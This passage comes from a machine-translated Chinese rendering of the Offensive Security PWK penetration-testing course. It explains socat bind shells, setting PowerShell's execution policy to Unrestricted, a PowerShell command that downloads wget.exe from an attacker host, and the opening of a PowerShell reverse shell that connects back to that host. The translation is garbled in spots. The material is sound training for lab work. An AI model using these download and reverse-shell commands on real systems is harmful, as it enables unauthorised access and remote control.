<div style="position:absolute;top:100565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.</font><font style="vertical-align: inherit;">在你的 Windows 系统上</font><font style="vertical-align: inherit;">制作一个未加密的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">绑定 shell。</font><font style="vertical-align: inherit;">使用连接到外壳</font></font></nobr></div>
<div style="position:absolute;top:100585;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网猫。</font><font style="vertical-align: inherit;">它有效吗？</font></font></nobr></div>
<div style="position:absolute;top:100617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意：如果</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd.exe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未执行，请研究您可能需要传递给</font></font></nobr></div>
<div style="position:absolute;top:100637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXEC 选项基于您收到的错误。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3 PowerShell 和 Powercat</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一种基于任务的命令行外壳和脚本语言。</font><font style="vertical-align: inherit;">它被设计</font></font></nobr></div>
<div style="position:absolute;top:100735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专门为系统管理员和高级用户快速自动化管理</font></font></nobr></div>
<div style="position:absolute;top:100754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个操作系统（Linux、macOS、Unix 和 Windows）以及与</font></font></nobr></div>
<div style="position:absolute;top:100774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在其上运行的应用程序。</font></font></nobr></div>
<div style="position:absolute;top:100806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">毋庸置疑，PowerShell 是一个强大的渗透测试工具，可以安装在（或正在</font></font></nobr></div>
<div style="position:absolute;top:100826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认安装在）各种版本的 Windows 上。</font><font style="vertical-align: inherit;">它默认安装在现代 Windows 上</font></font></nobr></div>
<div style="position:absolute;top:100845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Windows Server 2008 R2 和 Windows 7 开始的平台。Windows PowerShell 5.0 运行</font></font></nobr></div>
<div style="position:absolute;top:100865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在以下版本的 Windows 上：</font></font></nobr></div>
<div style="position:absolute;top:100898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:100898;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Server 2016，默认安装</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:101007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">87 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 信息项目，2006 年），http://www.linfo.org/stdio.html</font></font></font></nobr></div>
<div style="position:absolute;top:101027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/powershell/scripting/powershell-scripting?view=powershell-5.1</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:101155;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="86"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 86 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:101188;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:102265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:102265;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:102265;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">86</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:101284;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有 Service Pack 的 Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2</font></font></nobr></div>
<div style="position:absolute;top:101303;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1/Windows 8.1/Windows 7 with Service Pack 1（安装 Windows Management Framework</font></font></nobr></div>
<div style="position:absolute;top:101322;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.0 运行它）</font></font></nobr></div>
<div style="position:absolute;top:101355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell 4.0 在以下版本的 Windows 上运行：</font></font></nobr></div>
<div style="position:absolute;top:101388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:101388;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 8.1/Windows Server 2012 R2，默认安装</font></font></nobr></div>
<div style="position:absolute;top:101416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:101416;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 7 Service Pack 1/Windows Server 2008 R2 Service Pack 1（安装</font></font></nobr></div>
<div style="position:absolute;top:101436;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Framework 4.0 来运行它）</font></font></nobr></div>
<div style="position:absolute;top:101469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell 3.0 在以下版本的 Windows 上运行：</font></font></nobr></div>
<div style="position:absolute;top:101502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:101502;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 8/Windows Server 2012，默认安装</font></font></nobr></div>
<div style="position:absolute;top:101530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:101530;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 7 Service Pack 1/Windows Server 2008 R2 Service Pack 1/2（安装</font></font></nobr></div>
<div style="position:absolute;top:101549;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Framework 3.0 来运行它）</font></font></nobr></div>
<div style="position:absolute;top:101582;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 包含一个内置的集成开发环境 (IDE)，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">89</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">称为 Windows</font></font></nobr></div>
<div style="position:absolute;top:101601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 集成脚本环境 (ISE)。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">90</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ISE 是 Windows 的主机应用程序</font></font></nobr></div>
<div style="position:absolute;top:101621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 使我们能够在单个 Windows 中运行命令、编写、测试和调试脚本——</font></font></nobr></div>
<div style="position:absolute;top:101640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于图形用户界面。</font><font style="vertical-align: inherit;">该界面提供多行编辑、制表符完成、语法</font></font></nobr></div>
<div style="position:absolute;top:101659;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">着色、选择性执行、上下文相关帮助、支持从右到左的语言等等：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101958;left:386"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 10：PowerShell ISE</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 维护一个执行策略，用于确定哪种类型的 PowerShell 脚本（如果有）</font></font></nobr></div>
<div style="position:absolute;top:102008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以在系统上运行。</font><font style="vertical-align: inherit;">默认策略是“受限”，这实际上意味着系统</font></font></nobr></div>
<div style="position:absolute;top:102028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">既不会加载 PowerShell 配置文件，也不会运行 PowerShell 脚本。</font><font style="vertical-align: inherit;">为此目的</font></font></nobr></div>
<div style="position:absolute;top:102047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，我们需要在我们的 Windows 客户端机器上设置一个“无限制”执行策略。</font><font style="vertical-align: inherit;">至</font></font></nobr></div>
<div style="position:absolute;top:102066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们单击 Windows</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开始</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮，右键单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序，然后</font></font></nobr></div>
<div style="position:absolute;top:102086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以管理员身份运行</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">当出现用户帐户控制提示时，选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是，</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后</font></font></nobr></div>
<div style="position:absolute;top:102105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-ExecutionPolicy Unrestricted</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:102181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">89 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Integrated_development_environment</font></font></font></nobr></div>
<div style="position:absolute;top:102201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">90 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/powershell/scripting/components/ise/introducing-the-windows-powershell-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ise?view=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:102343;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="87"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 87 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102376;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:103453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:103453;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:103453;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">87</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102474;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows PowerShell</font></font></nobr></div>
<div style="position:absolute;top:102491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:102525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\WINDOWS\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-ExecutionPolicy Unrestricted</font></font></font></b></nobr></div>
<div style="position:absolute;top:102559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行政策变更</font></font></nobr></div>
<div style="position:absolute;top:102576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行策略有助于保护您免受您不信任的脚本的攻击。</font><font style="vertical-align: inherit;">改变</font></font></nobr></div>
<div style="position:absolute;top:102592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行策略可能会使您面临 </font></font></nobr></div>
<div style="position:absolute;top:102609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">about_Execution_Policies 帮助主题位于 https://go.microsoft.com/fwlink/?LinkID=135170。 </font></font></nobr></div>
<div style="position:absolute;top:102627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您要更改执行策略吗？</font></font></nobr></div>
<div style="position:absolute;top:102644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[Y] 是 [A] 全是 [N] 否 [L] 全否 [S] 暂停 [?] 帮助（默认为“N”）</font></font></nobr></div>
<div style="position:absolute;top:102661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:102694;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\WINDOWS\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-ExecutionPolicy</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:102711;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无限制</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102731;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 101 - 设置 PowerShell 执行策略</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 响应迅速且功能强大，使我们能够执行多项任务，而无需</font></font></nobr></div>
<div style="position:absolute;top:102779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标上安装其他工具。</font><font style="vertical-align: inherit;">让我们进一步探索 PowerShell 以演示它如何</font></font></nobr></div>
<div style="position:absolute;top:102799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会在渗透测试期间发挥作用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:102833;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.1 PowerShell 文件传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续 Alice 和 Bob，我们将使用 PowerShell 将文件从 Bob 传输到 Alice。</font></font></nobr></div>
<div style="position:absolute;top:102904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 PowerShell 的强大功能和灵活性，这并不像想象的那么简单</font></font></nobr></div>
<div style="position:absolute;top:102923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Netcat 甚至 socat，使这些前几个命令乍一看有点混乱。</font><font style="vertical-align: inherit;">我们将</font></font></nobr></div>
<div style="position:absolute;top:102943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行命令，然后分解组件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:102995;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec\Desktop&gt; wget.exe </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-V</font></font></font></b></nobr></div>
<div style="position:absolute;top:103045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GNU Wget 1.9.1</font></font></nobr></div>
<div style="position:absolute;top:103080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (C) 2003 Free Software Foundation, Inc.</font></font></nobr></div>
<div style="position:absolute;top:103096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个程序是分发的，希望它有用，</font></font></nobr></div>
<div style="position:absolute;top:103113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但没有任何保证；</font><font style="vertical-align: inherit;">甚至没有暗示的保证</font></font></nobr></div>
<div style="position:absolute;top:103130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定用途的适销性或适用性。</font><font style="vertical-align: inherit;">见</font></font></nobr></div>
<div style="position:absolute;top:103147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关更多详细信息，请参阅 GNU 通用公共许可证。</font></font></nobr></div>
<div style="position:absolute;top:103181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最初由 Hrvoje Niksic &lt;hniksic@xemacs.org&gt; 编写。</font></font></nobr></div>
<div style="position:absolute;top:103201;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 102 - 使用 PowerShell 下载文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到命令执行了，文件被传输了，并且它没有发生意外地执行。</font></font></nobr></div>
<div style="position:absolute;top:103249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来分析一下导致这种情况发生的 PowerShell 命令。</font></font></nobr></div>
<div style="position:absolute;top:103282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们使用了</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项。</font><font style="vertical-align: inherit;">这将执行提供的命令（用双引号括起来）</font></font></nobr></div>
<div style="position:absolute;top:103302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就好像它是在 PowerShell 提示符下键入的一样。</font></font></nobr></div>
<div style="position:absolute;top:103334;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在执行的命令包含几个组件。</font><font style="vertical-align: inherit;">首先，我们使用“新对象”</font></font></nobr></div>
<div style="position:absolute;top:103354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet，它允许我们实例化 .Net Framework 或 COM 对象。</font><font style="vertical-align: inherit;">在这种情况下，我们</font></font></nobr></div>
<div style="position:absolute;top:103373;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在创建</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WebClient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类</font><font style="vertical-align: inherit;">的实例，</font><font style="vertical-align: inherit;">该类在</font></font></nobr></div>
<div style="position:absolute;top:103392;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命名空间。</font><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web客户端</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类用于由URI，它标识访问资源</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:103531;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="88"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 88 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:103564;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:104641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:104641;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:104641;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">88</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">公开一个名为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadFile</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的公共方法</font><font style="vertical-align: inherit;">，它需要我们的两个关键参数：一个源</font></font></nobr></div>
<div style="position:absolute;top:103679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位置（如我们之前所述的 URI 形式），以及检索到的目标位置</font></font></nobr></div>
<div style="position:absolute;top:103698;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据将被存储。</font></font></nobr></div>
<div style="position:absolute;top:103731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这种语法可能看起来令人困惑，但实际上相当简单。</font><font style="vertical-align: inherit;">参考微软</font></font></nobr></div>
<div style="position:absolute;top:103751;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">91</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以查看此命名空间中所有已实现类的列表。</font><font style="vertical-align: inherit;">然后，</font></font></nobr></div>
<div style="position:absolute;top:103770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一直到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WebClient</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类，最后到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DownloadFile</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法来可视化</font></font></nobr></div>
<div style="position:absolute;top:103789;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们示例中使用的类和方法的结构。</font></font></nobr></div>
<div style="position:absolute;top:103822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Bob 的计算机上下载 wget.exe 可执行文件后，他可以将其用作另一种工具</font></font></nobr></div>
<div style="position:absolute;top:103842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载其他文件或继续使用 PowerShell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:103876;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.2 PowerShell 反向 Shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将利用 PowerShell one-liners </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">92</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行 shell，从反向开始</font></font></nobr></div>
<div style="position:absolute;top:103933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳。</font></font></nobr></div>
<div style="position:absolute;top:103966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将在 Alice 的计算机上设置一个简单的 Netcat 侦听器：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:104018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:104037;left:247"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 103 - 使用 nc 设置侦听器以接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将从 Bob 的计算机发送一个 PowerShell 反向 shell。</font><font style="vertical-align: inherit;">同样，这在语法上不是</font></font></nobr></div>
<div style="position:absolute;top:104086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像 Netcat 或 socat 一样干净，但由于 PowerShell 在大多数现代 Windows 机器上都是原生的，它</font></font></nobr></div>
<div style="position:absolute;top:104105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们探索这个 PowerShell 等效项很重要。</font><font style="vertical-align: inherit;">首先，让我们看一下代码，然后</font></font></nobr></div>
<div style="position:absolute;top:104125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后分解它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104160;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);</font></font></nobr></div>
<div style="position:absolute;top:104176;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$stream = $client.GetStream();</font></font></nobr></div>
<div style="position:absolute;top:104193;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[byte[]]$bytes = 0..65535|%{0};</font></font></nobr></div>
